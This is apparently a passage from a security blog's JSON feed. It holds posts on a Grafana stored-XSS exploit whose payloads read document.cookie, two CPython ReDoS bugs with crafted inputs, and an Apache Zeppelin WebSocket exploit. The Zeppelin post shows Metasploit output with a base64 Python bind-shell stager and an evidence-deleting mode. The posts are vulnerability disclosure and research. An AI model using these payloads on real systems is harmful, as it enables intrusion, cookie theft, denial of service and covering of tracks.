class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"title\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Hello Hello Hello Hello Hello Hello Hello Hello Hello Hello Hello Hello... repeated many times to make the screen fill up and cause the tooltip to be triggered\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"tooltip\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Hello &lt;u>there&lt;/u>&lt;script>alert('tooltip says ' + document.cookie)&lt;/script>\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"type\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"link\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"url\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"javascript:alert('3'+document.cookie)\"</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"refresh\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"5s\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"rows\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"height\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"500px\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"panels\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n                    <span class=\"token punctuation\">{</span>\n                        <span class=\"token property\">\"content\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Hello &lt;script>alert('panel says ' + document.cookie)&lt;/script>\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"datasource\"</span><span class=\"token operator\">:</span> <span class=\"token null keyword\">null</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"description\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Description\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"id\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"links\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"mode\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"html\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"span\"</span><span class=\"token operator\">:</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"targets\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"title\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Panel\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"type\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"text\"</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"span\"</span><span class=\"token operator\">:</span> <span class=\"token number\">12</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"schemaVersion\"</span><span class=\"token operator\">:</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"snapshot\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token property\">\"external\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"originalUrl\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"javascript:alert('4'+document.cookie)\"</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"style\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"dark\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"tags\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"templating\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token property\">\"list\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"time\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token property\">\"from\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"now-6h\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"to\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"now\"</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"timepicker\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token property\">\"refresh_intervals\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"time_options\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"timezone\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"browser\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"title\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"This is a snapshot\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"uid\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"abcdef\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"version\"</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre>\n<p>The response will be e.g.:</p>\n<pre class=\"language-json\" tabindex=\"0\"><code class=\"language-json\"><span class=\"token punctuation\">{</span>\n    <span class=\"token property\">\"deleteKey\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"bUT3gkzSCrsrGZScAbW1IM0RX4QUPXj0\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"deleteUrl\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"/api/snapshots-delete/bUT3gkzSCrsrGZScAbW1IM0RX4QUPXj0\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"5aCDFUkwwukLbIb2Ij516DnfBaPqmOdz\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"url\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"/dashboard/snapshot/5aCDFUkwwukLbIb2Ij516DnfBaPqmOdz\"</span>\n<span class=\"token punctuation\">}</span></code></pre>\n<p>and the dashboard is available at <code>url</code> or in the list at <code>/dashboard/snapshots</code>.</p>\n<p>The stored XSS is triggered:</p>\n<ul>\n<li>on page load (by using an html panel, normal functionality)</li>\n<li>on hovering over the &quot;Hello Hello Hello...&quot; (relying on CVE-2018-12099)</li>\n</ul>\n<h2 id=\"references\" tabindex=\"-1\">References <a class=\"header-anchor\" href=\"https://blog.caller.xyz/exploit-grafana-cve-2019-15043/\">#</a></h2>\n<ul>\n<li><a href=\"https://grafana.com/blog/2019/08/29/grafana-5.4.5-and-6.3.4-released-with-important-security-fix/\">Grafana blog for Important Security Fix</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/be2e2330f5c1f92082841d7eb13c5583143963a4\">Github fix</a></li>\n</ul>\n",
			"date_published": "2019-12-10T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/two-redos-vulns-in-cpython/",
			"url": "https://blog.caller.xyz/two-redos-vulns-in-cpython/",
			"title": "Two REDoS vulns in cpython",
			"content_html": "<p>I ran my top-secret REDoS-finding engine over the python code in cpython and found two remotely-exploitable vulnerabilities. Making a request to a malicious web server leads to denial of service (approximately infinite CPU time).</p>\n<h2 id=\"httpcookiejar\" tabindex=\"-1\">http.cookiejar <a class=\"header-anchor\" href=\"https://blog.caller.xyz/two-redos-vulns-in-cpython/\">#</a></h2>\n<p>This issue (<a href=\"https://bugs.python.org/issue38804\">bpo38804</a>) was serious because the vulnerable code could be as simple as:</p>\n<pre class=\"language-python\" tabindex=\"0\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\nrequests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"http://malicious/\"</span><span class=\"token punctuation\">)</span></code></pre>\n<p>To exploit this, simply cause your target to hit a malicious server running <a href=\"https://github.com/python/cpython/pull/17157#issue-341227681\">the proof-of-concept code in my fix PR</a> which sends massive <code>Set-Cookie</code> response headers.</p>\n<p>The underlying issue was the regular expression <code>http.cookiejar.LOOSE_HTTP_DATE_RE</code> used to parse the <code>Expires</code> field from <code>Set-Cookie</code> response headers.\nIgnoring the ?-optional capture groups, <a href=\"https://github.com/bcaller/cpython/blob/bb41147eab15a2958f4ad38261e5bf608f6ace1b/Lib/http/cookiejar.py#L204-L220\">the original regex</a> can be simplified to</p>\n<pre class=\"language-text\" tabindex=\"0\"><code class=\"language-text\">\\d+-\\w+-\\d+(\\s*\\s*\\s*)$</code></pre>\n<p>Therefore, a long sequence of spaces can trigger bad performance.\n<code>LOOSE_HTTP_DATE_RE</code> backtracked if last character didn't match <code>\\s</code> or <code>(?![APap][Mm]\\b)[A-Za-z]+</code>.</p>\n<p>Matching a malicious string such as</p>\n<pre class=\"language-python\" tabindex=\"0\"><code class=\"language-python\">LOOSE_HTTP_DATE_RE<span class=\"token punctuation\">.</span><span class=\"token keyword\">match</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1-1-1\"</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span> <span class=\"token operator\">*</span> <span class=\"token number\">2000</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"!\"</span><span class=\"token punctuation\">)</span></code></pre>\n<p>caused catastrophic backtracking. Timing on my computer when doubling the number of spaces:</p>\n<pre><code> n_spaces |  seconds\n      512       .383\n     1024      3.02\n     2048     23.4\n     4096    184\n     8192   1700\n</code></pre>\n<p>As expected, it's approx O(n<sup>3</sup>). The maximum <code>n_spaces</code> to fit in a <code>Set-Cookie</code> header is 65506 which will take days.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/PLa-XSqaro-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/PLa-XSqaro-1200.webp 1200w\"><img alt=\"Nice python team\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/PLa-XSqaro-1200.png\" width=\"1200\" height=\"316\"></picture><figcaption>Nice python team</figcaption></figure><p></p>\n<p>I fixed this bug with <a href=\"https://github.com/python/cpython/pull/17157\"><img alt=\":octocat:\" src=\"https://github.githubassets.com/images/icons/emoji/octocat.png?v8\" style=\"max-width: 1em; max-height: 1em; display: inline-block;\">my first contribution to python/cpython</a>.</p>\n<h2 id=\"urllibrequest\" tabindex=\"-1\">urllib.request <a class=\"header-anchor\" href=\"https://blog.caller.xyz/two-redos-vulns-in-cpython/\">#</a></h2>\n<p>Less code is vulnerable to this bug (<a href=\"https://bugs.python.org/issue39503\">bpo38826/bpo39503</a>) as it requires that you are using an auth handler. Vulnerable client:</p>\n<pre class=\"language-python\" tabindex=\"0\"><code class=\"language-python\"><span class=\"token keyword\">import</span> urllib<span class=\"token punctuation\">.</span>request\nopener <span class=\"token operator\">=</span> urllib<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">.</span>build_opener<span class=\"token punctuation\">(</span>\n    urllib<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">.</span>HTTPBasicAuthHandler<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">)</span>\nopener<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"http://malicious/\"</span><span class=\"token punctuation\">)</span></code></pre>\n<p>A malicious server just has to send back a 401 with a crafted <code>WWW-Authenticate</code> header such as <a href=\"https://bugs.python.org/msg356785\">my proof-of-concept code</a>.</p>\n<p>The vulnerable regular expression is <code>urllib.request.AbstractBasicAuthHandler.rx</code>:</p>\n<pre class=\"language-python\" tabindex=\"0\"><code class=\"language-python\">rx <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">'(?:.*,)*[ \\t]*([^ \\t]+)[ \\t]+'</span>\n                <span class=\"token string\">'realm=([\"\\']?)([^\"\\']*)\\\\2'</span><span class=\"token punctuation\">,</span> re<span class=\"token punctuation\">.</span>I<span class=\"token punctuation\">)</span></code></pre>\n<p>The first line can act like:</p>\n<pre class=\"language-text\" tabindex=\"0\"><code class=\"language-text\">(,*,)*(,+)[ \\t]</code></pre>\n<p>showing that there are many different ways to match a long sequence of commas.</p>\n<p>Input from the <code>WWW-Authenticate</code> or <code>Proxy-Authenticate</code> headers of HTTP responses will reach the regex via the <code>http_error_auth_reqed</code> method as long as the header value starts with <code>&quot;basic &quot;</code>.</p>\n<p>We can craft a malicious input:</p>\n<pre class=\"language-python\" tabindex=\"0\"><code class=\"language-python\">urllib<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">.</span>AbstractBasicAuthHandler<span class=\"token punctuation\">.</span>rx<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>\n    <span class=\"token string\">\"basic \"</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\",\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"A\"</span>\n<span class=\"token punctuation\">)</span></code></pre>\n<p>Which causes catastrophic backtracking and takes a large amount of CPU time to process. I tested the length of time (seconds) to complete for different numbers of commas in the string:</p>\n<pre><code>n_commas | seconds\n      18     0.289\n      19     0.57\n      20     1.14\n      21     2.29\n      22     4.55\n      23     9.17\n      24    18.3\n      25    36.5\n      26    75.1\n      27   167\n</code></pre>\n<p>Showing an exponential relationship O(2<sup>x</sup>) !</p>\n<p>The maximum length of comma string that can fit in a response header is 65509, which would take my computer <em>just</em> 6×10<sup>19706</sup> years to complete. Compare this to the worst case of the cubic <code>http.cookiejar</code> vulnerability above being measured in days.</p>\n<p>Another researcher later requested CVE-2020-8492 for this vulnerability. It is in the process of being <a href=\"https://github.com/python/cpython/pull/18284\">fixed</a>.</p>\n",
			"date_published": "2019-11-17T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/big-data-lake-big-data-leak/",
			"url": "https://blog.caller.xyz/big-data-lake-big-data-leak/",
			"title": "Big Data Lake, Big Data Leak",
			"content_html": "<p>I gave a Rookie Track presentation at BSides London 2019 about my research into hacking Elastic Map Reduce (EMR) and <s>extorting</s>asking companies for beg bounties.</p>\n<p>https://www.youtube.com/watch?v=RX32S6DMYUw</p>\n",
			"date_published": "2019-11-13T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/apache-zeppelin-vulnerability-metasploit/",
			"url": "https://blog.caller.xyz/apache-zeppelin-vulnerability-metasploit/",
			"title": "Apache Zeppelin Vulnerability + Metasploit",
			"content_html": "<p><a href=\"https://zeppelin.apache.org\">Apache Zeppelin</a> is a &quot;Web-based notebook that enables data-driven, interactive data analytics and collaborative documents...&quot; which is very similar to Jupyter notebook. Notebook servers offer polyglot Remote Code Execution (RCE) by design, so gaining access to one would make pwning the entire Hadoop cluster and all its data fairly simple.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/OZZgOqPmzF-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/OZZgOqPmzF-1200.webp 1200w\"><img alt=\"How would you like your RCE?\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/OZZgOqPmzF-1200.png\" width=\"1200\" height=\"885\"></picture><figcaption>How would you like your RCE?</figcaption></figure><p></p>\n<p>It's interesting because AWS Elastic MapReduce (EMR) Hadoop clusters and the like tend to have it installed, so it's becoming quite prevalent among data-science teams who may not be security trained.</p>\n<p>From a honeypot EMR cluster with all ports exposed to the internet, I found it takes about 6 minutes before the YARN ResourceManager on port 8088 is found by scanners. YARN allows commands to be submitted via a REST API, which will then be scheduled to run on the cluster. Run-of-the-mill Mirai-variant malware was downloaded and the cluster nodes were recruited to take part in DDoS attacks. They weren't super successful as they kept hitting the memory limits and getting killed, but still tried to send a lot of UDP traffic.</p>\n<p>Moral of the story: Don't expose your EMR clusters to the internet as pretty much every port except SSH either leaks data or allows unauthenticated RCE.</p>\n<h2 id=\"but-anyway-onto-zeppelin\" tabindex=\"-1\">But anyway, onto Zeppelin. <a class=\"header-anchor\" href=\"https://blog.caller.xyz/apache-zeppelin-vulnerability-metasploit/\">#</a></h2>\n<p>By default it's completely unauthenticated, but I assume people who want to expose it publicly will turn on the inbuilt authentication. Which is fine if they follow the <a href=\"http://zeppelin.apache.org/docs/0.8.0/setup/security/shiro_authentication.html\">instructions</a>. However, there are two steps:</p>\n<ol>\n<li>\n<p><strong>Enable Apache Shiro authentication</strong>. Basically modifying the provided template <code>conf/shiro.ini</code> config file and entering some plaintext usernames and passwords. You can alternatively configure LDAP / AD.</p>\n</li>\n<li>\n<p><strong>Secure the Websocket channel</strong>. Set <code>zeppelin.anonymous.allowed</code> to <code>false</code> in <code>conf/zeppelin-site.xml</code>.\nYou will then need to be logged in and retrieve a ticket from <code>/api/security/ticket</code> before using the WebSocket.</p>\n</li>\n</ol>\n<p>It seems that a widespread misconfiguration is to perform only step 1.\nAfter step 1, it looks from the web interface as if Zeppelin is sufficiently secure.\nYou will see a Login button in the top-right corner, and you won't be able to see any of the notebooks <strong>through the web interface</strong> until you login.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/014M4eaYq8-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/014M4eaYq8-1200.webp 1200w\"><img alt=\"Everything looks secure\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/014M4eaYq8-1200.png\" width=\"1200\" height=\"488\"></picture><figcaption>Everything looks secure</figcaption></figure><p></p>\n<p>However, the WebSocket's xml config still has anonymous access allowed, which gives complete control.</p>\n<p>You can check for this, by sending the following payload to the Websocket at <code>/ws</code>:</p>\n<pre class=\"language-json\" tabindex=\"0\"><code class=\"language-json\"><span class=\"token punctuation\">{</span><span class=\"token property\">\"op\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"LIST_CONFIGURATIONS\"</span><span class=\"token punctuation\">,</span><span class=\"token property\">\"principal\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"anonymous\"</span><span class=\"token punctuation\">,</span><span class=\"token property\">\"ticket\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"anonymous\"</span><span class=\"token punctuation\">,</span><span class=\"token property\">\"roles\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"[]\"</span><span class=\"token punctuation\">}</span></code></pre>\n<p>If you get a response, the service is vulnerable.</p>\n<h2 id=\"is-this-a-common-misconfiguration\" tabindex=\"-1\">Is this a common misconfiguration? <a class=\"header-anchor\" href=\"https://blog.caller.xyz/apache-zeppelin-vulnerability-metasploit/\">#</a></h2>\n<p>The shodan search <a href=\"https://www.shodan.io/search?query=zeppelin+%22WITHOUT+WARRANTIES+OR+CONDITIONS%22\">zeppelin &quot;WITHOUT WARRANTIES OR CONDITIONS&quot;</a> should find Apache Zeppelin instances. I only found one which wasn't vulnerable. Scanning the AWS IP range on a plausible port (8890) will find more temporary instances backed by EMR clusters.</p>\n<h2 id=\"how-the-exploit-works\" tabindex=\"-1\">How the exploit works <a class=\"header-anchor\" href=\"https://blog.caller.xyz/apache-zeppelin-vulnerability-metasploit/\">#</a></h2>\n<ol>\n<li>Send op <code>NEW_NOTE</code></li>\n<li>Wait for <code>NEW_NOTE</code> response with note ID</li>\n<li>Send <code>INSERT_PARAGRAPH</code></li>\n<li>Wait for <code>PARAGRAPH_ADDED</code> with paragraph ID</li>\n<li>Send <code>RUN_PARAGRAPH</code> with the payload and language</li>\n<li>Receive polling updates with status: PENDING, RUNNING, FINISHED, ERROR.</li>\n</ol>\n<p>There are a load of different interpreters. The datascience interpreters might not have been configured though, so the simplest will be to use python or sh to get a shell.</p>\n<p>There do exist systems where only the spark interpreter is available. In that case, script kiddies will have to learn scala!</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/gCitzip4Ey-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/gCitzip4Ey-1200.webp 1200w\"><img alt=\"Poor script kiddie can't figure out how to mine monero\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/gCitzip4Ey-1200.png\" width=\"1200\" height=\"581\"></picture><figcaption>Poor script kiddie can't figure out how to mine monero</figcaption></figure><p></p>\n<h2 id=\"run-shell-commands-from-scala\" tabindex=\"-1\">Run shell commands from scala <a class=\"header-anchor\" href=\"https://blog.caller.xyz/apache-zeppelin-vulnerability-metasploit/\">#</a></h2>\n<pre class=\"language-scala\" tabindex=\"0\"><code class=\"language-scala\"><span class=\"token keyword\">import</span> <span class=\"token namespace\">scala<span class=\"token punctuation\">.</span>sys<span class=\"token punctuation\">.</span>process<span class=\"token punctuation\">.</span></span>_\nprint<span class=\"token punctuation\">(</span><span class=\"token string\">\"ps waxf\"</span> <span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">)</span></code></pre>\n<p>Scala is such a messed up language.</p>\n<h2 id=\"metasploit\" tabindex=\"-1\">Metasploit <a class=\"header-anchor\" href=\"https://blog.caller.xyz/apache-zeppelin-vulnerability-metasploit/\">#</a></h2>\n<p>I thought this would be a good time to finally learn how to write a Metasploit module.</p>\n<p>We have a <code>check</code> command which tells you if a service is vulnerable</p>\n<pre class=\"language-text\" tabindex=\"0\"><code class=\"language-text\">msf5 exploit(ws) > set rhosts 10.8.3.3\nrhosts => 10.8.3.3\nmsf5 exploit(ws) > set rport 1234\nrport => 1234\nmsf5 exploit(ws) > check\n\n[+] 10.8.3.3:1234 - WebSocket 10.8.3.3:1234/ws connected\n[*] 10.8.3.3:1234 - Interpreters: spark,md,angular,sh,livy,alluxio,file,psql,flink,python,ignite,lens,cassandra,geode,kylin,elasticsearch,scalding,jdbc,hbase,bigquery,beam,pig,scio,groovy,neo4j\n[+] 10.8.3.3:1234 - The target is vulnerable.</code></pre>\n<p>And then an <code>exploit</code> command which takes a payload (here a staged Meterpreter bind shell), executes it and gets a shell.</p>\n<pre class=\"language-text\" tabindex=\"0\"><code class=\"language-text\">msf5 exploit(ws) > set payload python/meterpreter/bind_tcp\npayload => python/meterpreter/bind_tcp\nmsf5 exploit(ws) > exploit\n\n[+] 10.8.3.3:1234 - WebSocket 10.8.3.3:1234/ws connected\n[+] 10.8.3.3:1234 - Created note 2EB1RJQH9 wyhuqCxyHpGT\n[+] 10.8.3.3:1234 - Created paragraph 20190511-183457_1324276293\n[*] 10.8.3.3:1234 - PENDING\n[*] 10.8.3.3:1234 - RUNNING\n[*] 10.8.3.3:1234 - {\"op\":\"PARAGRAPH\",\"data\":{\"paragraph\":{\"text\":\"import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QKYj1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpiLmJpbmQoKCcwLjAuMC4wJyw0NDQ0KSkKYi5saXN0ZW4oMSkKcyxhPWIuYWNjZXB0KCkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyhkLHsncyc6c30pCg==')))\",\"user\":\"anonymous\",\"dateUpdated\":\"2019-05-11T18:35:00+0000\",\"config\":{\"colWidth\":12.0,\"editorMode\":\"ace/mode/python\",\"fontSize\":9.0,\"enabled\":true,\"results\":{},\"editorSetting\":{\"language\":\"python\",\"editOnDblClick\":false,\"completionSupport\":true}},\"settings\":{\"params\":{},\"forms\":{}},\"apps\":[],\"jobName\":\"paragraph_1557599697676_1276214488\",\"id\":\"20190511-183457_1324276293\",\"dateCreated\":\"2019-05-11T18:34:57+0000\",\"dateStarted\":\"2019-05-11T18:35:00+0000\",\"status\":\"RUNNING\",\"errorMessage\":\"\",\"progressUpdateIntervalMs\":500}},\"ticket\":\"anonymous\",\"principal\":\"anonymous\",\"roles\":\"\"}\n[*] Started bind TCP handler against 10.8.3.3:4444\n[*] Sending stage (53770 bytes) to 10.8.3.3\n[*] Meterpreter session 4 opened (10.0.2.15:34617 -> 10.8.3.3:4444) at 2019-05-11 14:22:06 -0400</code></pre>\n<p>Another mode is to send a specific command and wait for it to <code>COMPLETE</code>. It will then sneakily delete the evidence.</p>\n<pre class=\"language-text\" tabindex=\"0\"><code class=\"language-text\">msf5 exploit(ws) > show targets\n\nExploit targets:\n\n   Id  Name\n   --  ----\n   0   Python payload\n   1   Command payload\n\nmsf5 exploit(ws) > set target 1\ntarget => 1\nmsf5 exploit(ws) > set payload generic/custom\npayload => generic/custom\nmsf5 exploit(ws) > set COMPLETE true\nCOMPLETE => true\nmsf5 exploit(ws) > set payloadstr \"ps aux\"\npayloadstr => ps aux\nmsf5 exploit(ws) > exploit\n\n[+] 10.8.3.3:1234 - WebSocket 10.8.3.3:1234/ws connected\n[+] 10.8.3.3:1234 - Created note 2EATUUSED QFgMcsIJSQzHvGbENw\n[+] 10.8.3.3:1234 - Created paragraph 20190511-231105_1295465714\n[*] 10.8.3.3:1234 - PENDING\n[*] 10.8.3.3:1234 - FINISHED\n[+] 10.8.3.3:1234 - USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot         1  0.0  0.0   4364    12 ?        Ss   18:26   0:00 /usr/bin/tini -- bin/zeppelin.sh\nroot         6  0.3  5.2 4671604 420016 ?      Sl   18:26   1:00 /usr/lib/jvm/java-8-openjdk-amd64/bin/java -Dfile.encoding=UTF-8 -Xms1024m -Xmx1024m -XX:MaxPermSize=512m -Dlog4j.configuration=file:///zeppelin/conf/log4j.properties -Dzeppelin.log.file=/zeppelin/logs/zeppelin--04c5df9b52d5.log -cp ::/zeppelin/lib/interpreter/*:/zeppelin/lib/*:/zeppelin/*::/zeppelin/conf org.apache.zeppelin.server.ZeppelinServer\nroot        84  0.0  0.0  19764   168 ?        S    18:29   0:00 /bin/bash /zeppelin/bin/interpreter.sh -d /zeppelin/interpreter/python -c 172.17.0.2 -p 35004 -r : -l /zeppelin/local-repo/python -g python\n...snip...\nroot       295  0.0  0.4 594692 38996 ?        Ssl  18:35   0:03 /opt/conda/bin/python -m ipykernel_launcher -f /tmp/tmpMJSdvG.json\nroot       310  0.0  0.0  19904   784 pts/1    Ss+  18:40   0:00 bash\nroot       367  0.0  0.0  36084  3112 ?        R    23:11   0:00 ps aux\n\n[*] 10.8.3.3:1234 - Deleting note 2EATUUSED QFgMcsIJSQzHvGbENw\n[*] Exploit completed, but no session was created.</code></pre>\n<p>It's quite fun. I did find the process of writing a module annoying as I didn't find the documentation or examples sufficient.</p>\n<p>In the case of a shell session, I might only want to delete the note after I've finished with the session. Really I just want a separate command which takes a notebook ID and deletes it in case of error. However, I wasn't sure how to do that. Maybe it would require writing an auxiliary module? Or maybe this just shows the limitation of Metasploit exploits if the task isn't just a plug-and-play shell.</p>\n<p>Since I don't think you can add a ruby gem to a module without forking metasploit, I cobbled together a ruby websockets client based on code from <a href=\"https://blog.pusher.com/websockets-from-scratch/\">Pusher blog</a>. Fun. To be honest, I might have been better off writing my own code outside Metasploit, but it's good for me to understand how the module system works. Since WebSockets work cross-origin, it could even be a webpage where you input the host and port.</p>\n<p>Anyway, module code is available as a <a href=\"https://gist.github.com/bcaller/4f667ffddc23642b1017a1b8f2a7172c\">Gist: apache_zeppelin_websocket.rb</a>. To install put it in <code>.msf4/modules/exploits/</code>. Don't use it for evil.</p>\n<h2 id=\"update-play-around\" tabindex=\"-1\">Update: Play around <a class=\"header-anchor\" href=\"https://blog.caller.xyz/apache-zeppelin-vulnerability-metasploit/\">#</a></h2>\n<p>I set some challenges including a vulnerable Zeppelin for a CTF. You can run a local copy to play around: <a href=\"https://github.com/bcaller/sectalks-lon0x24-ctf/tree/master/hindenburger\"><img alt=\":octocat:\" src=\"https://github.githubassets.com/images/icons/emoji/octocat.png?v8\" style=\"max-width: 1em; max-height: 1em; display: inline-block;\">bcaller/sectalks-lon0x24-ctf</a></p>\n",
			"date_published": "2019-05-10T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/your-s3-buckets-are-leaking/",
			"url": "https://blog.caller.xyz/your-s3-buckets-are-leaking/",
			"title": "Your S3 buckets are leaking",
